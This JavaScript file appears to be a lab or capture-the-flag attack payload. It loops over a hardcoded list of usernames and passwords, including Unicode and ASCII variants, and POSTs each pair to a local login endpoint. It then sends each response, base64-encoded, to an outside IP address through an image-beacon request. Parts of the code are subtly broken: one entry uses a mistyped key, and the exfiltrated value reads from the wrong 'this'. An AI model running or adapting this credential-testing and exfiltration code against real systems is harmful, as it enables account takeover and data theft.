const users = [
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Łukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Þór", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "Ægir", ipasd: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Çetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "José", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "AEgir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "Jose", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios y en minusculas.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "aegir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "jose", pas: "FuLqqEAErWQsmTQQQhsb" }
];

function testUser(data) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/login", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
        new Image().src=`http://192.168.26.10/?resText=${btoa(this.responseText)}`
    }
    xhr.send(JSON.stringify(data));
}

users.forEach(async user => {
    // Envía la petición con el body en JSON
    await new Promise(r=>setTimeout(r,800));
    testUser({
        username: user.nombre,
        password: user.pas
    });
});